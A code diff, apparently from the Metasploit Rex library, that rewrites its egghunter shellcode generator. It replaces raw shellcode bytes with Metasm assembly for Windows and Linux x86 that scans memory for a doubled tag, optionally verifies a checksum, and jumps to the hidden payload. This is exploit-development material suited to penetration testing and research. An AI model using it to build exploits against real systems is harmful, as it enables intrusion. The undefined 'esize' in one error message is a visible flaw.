@@ -12,6 +12,13 @@ module Exploitation
 # overflow occurs, but it's possible to stick a larger payload somewhere else
 # in memory that may not be directly predictable.
 #
+# Original implementation by skape
+# (See http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf)
+#
+# Checksum checking implemented by dijital1/corelanc0d3r
+# Checksum code merged to Egghunter by jduck
+# Conversion to use Metasm by jduck
+#
 ###
 class Egghunter
 
@@ -29,21 +36,51 @@ class Egghunter
 			#
 			# The egg hunter stub for win/x86.
 			#
-			def hunter_stub
-				{
-					'Stub' => 
-						"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02" +
-						"\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8" +
-						"\x41\x41\x41\x41" +
-						"\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7",
-					'EggSize'   => 4,
-					'EggOffset' => 0x12
-				}
+			def hunter_stub(payload, badchars = '', opts = {})
+
+				raise RuntimeError, "Invalid egg string! Need #{esize} bytes." if opts[:eggtag].length != 4
+				marker = "0x%x" % opts[:eggtag].unpack('V').first
+
+				checksum = checksum_stub(payload, badchars, opts)
+
+				assembly = <<EOS
+check_readable:
+	or dx,0xfff
+next_addr:
+	inc edx
+	push edx
+	push 0x02   ; use NtAccessCheckAndAuditAlarm syscall
+	pop eax
+	int 0x2e
+	cmp al,5
+	pop edx
+	je check_readable
+check_for_tag:
+	; check that the tag matches once
+	mov eax,#{marker}
+	mov edi,edx
+	scasd
+	jne next_addr
+	; it must match a second time too
+	scasd
+	jne next_addr
+
+	; check the checksum if the feature is enabled
+#{checksum}
+
+	; jump to the payload
+	jmp edi
+EOS
+
+				assembled_code = Metasm::Shellcode.assemble(Metasm::Ia32.new, assembly).encode_string
+
+				# return the stub
+				assembled_code
 			end
-	
+
 		end
 	end
-	
+
 	###
 	#
 	# Linux-based egghunters
@@ -58,16 +95,46 @@ class Egghunter
 			#
 			# The egg hunter stub for linux/x86.
 			#
-			def hunter_stub
-				{
-					'Stub' => 
-						"\xfc\x66\x81\xc9\xff\x0f\x41\x6a\x43\x58\xcd\x80" +
-						"\x3c\xf2\x74\xf1\xb8" +
-						"\x41\x41\x41\x41" +
-						"\x89\xcf\xaf\x75\xec\xaf\x75\xe9\xff\xe7",
-					'EggSize'   => 4,
-					'EggOffset' => 0x11
-				}
+			def hunter_stub(payload, badchars = '', opts = {})
+
+				raise RuntimeError, "Invalid egg string! Need #{esize} bytes." if opts[:eggtag].length != 4
+				marker = "0x%x" % opts[:eggtag].unpack('V').first
+
+				checksum = checksum_stub(payload, badchars, opts)
+
+				assembly = <<EOS
+	cld
+check_readable:
+	or cx,0xfff
+next_addr:
+	inc ecx
+	push 0x43   ; use 'sigaction' syscall
+	pop eax
+	int 0x80
+	cmp al,0xf2
+	je check_readable
+
+check_for_tag:
+	; check that the tag matches once
+	mov eax,#{marker}
+	mov edi,ecx
+	scasd
+	jne next_addr
+	; it must match a second time too
+	scasd
+	jne next_addr
+
+	; check the checksum if the feature is enabled
+#{checksum}
+
+	; jump to the payload
+	jmp edi
+EOS
+
+				assembled_code = Metasm::Shellcode.assemble(Metasm::Ia32.new, assembly).encode_string
+
+				# return the stub
+				assembled_code
 			end
 
 		end
@@ -88,7 +155,7 @@ class Egghunter
 		Egghunter.constants.each { |c|
 			mod = self.class.const_get(c)
 
-			next if ((!mod.kind_of?(::Module)) or 
+			next if ((!mod.kind_of?(::Module)) or
 			         (!mod.const_defined?('Alias')))
 
 			if (platform =~ /#{mod.const_get('Alias')}/i)
@@ -98,7 +165,7 @@ class Egghunter
 					mod.constants.each { |a|
 						amod = mod.const_get(a)
 
-						next if ((!amod.kind_of?(::Module)) or 
+						next if ((!amod.kind_of?(::Module)) or
 						         (!amod.const_defined?('Alias')))
 
 						if (arch =~ /#{mod.const_get(a).const_get('Alias')}/i)
@@ -115,21 +182,29 @@ class Egghunter
 	#
 	# This method generates an egghunter using the derived hunter stub.
 	#
-	def generate(badchars = '', marker = nil)
-		return nil if ((opts = hunter_stub) == nil)
+	def generate(payload, badchars = '', opts = {})
+		# set defaults if options are missing
 
-		stub  = opts['Stub'].dup
-		esize = opts['EggSize']
-		eoff  = opts['EggOffset']
+		# NOTE: there is no guarantee this won't exist in memory, even when doubled.
+		# To address this, use the checksum feature :)
+		opts[:eggtag] ||= Rex::Text.rand_text(4, badchars)
 
-		egg   = marker
-		# NOTE: there is no guarentee this wont exist in memory, even when doubled
-		egg ||= Rex::Text.rand_text(esize, badchars)
-		raise RuntimeError, "Invalid egg string! Need #{esize} bytes." if egg.length != esize
+		# Generate the hunter_stub portion
+		return nil if ((hunter = hunter_stub(payload, badchars, opts)) == nil)
 
-		stub[eoff, esize] = egg
+		# Generate the marker bits to be prefixed to the real payload
+		egg = ''
+		egg << opts[:eggtag] * 2
+		egg << payload
+		if opts[:checksum]
+			cksum = 0
+			payload.each_byte { |b|
+				cksum += b
+			}
+			egg << [cksum & 0xff].pack('C')
+		end
 
-		return [ stub, egg ]
+		return [ hunter, egg ]
 	end
 
 protected
@@ -138,7 +213,35 @@ protected
 	# Stub method that is meant to be overridden.  It returns the raw stub that
 	# should be used as the egghunter.
 	#
-	def hunter_stub
+	def hunter_stub(payload, badchars = '', opts = {})
+	end
+
+	def checksum_stub(payload, badchars = '', opts = {})
+		return '' if not opts[:checksum]
+
+		if payload.length < 0x100
+			cmp_reg = "cl"
+		elsif payload.length < 0x10000
+			cmp_reg = "cx"
+		else
+			raise RuntimeError, "Payload too big!"
+		end
+		egg_size = "0x%x" % payload.length
+
+		checksum = <<EOS
+	push ecx
+	xor ecx,ecx
+	xor eax,eax
+calc_chksum_loop:
+	add al,byte [edi+ecx]
+	inc ecx
+	cmp #{cmp_reg},#{egg_size}
+	jnz calc_chksum_loop
+test_chksum:
+	cmp al,byte [edi+ecx]
+	pop ecx
+	jnz next_addr
+EOS
 	end
 
 end
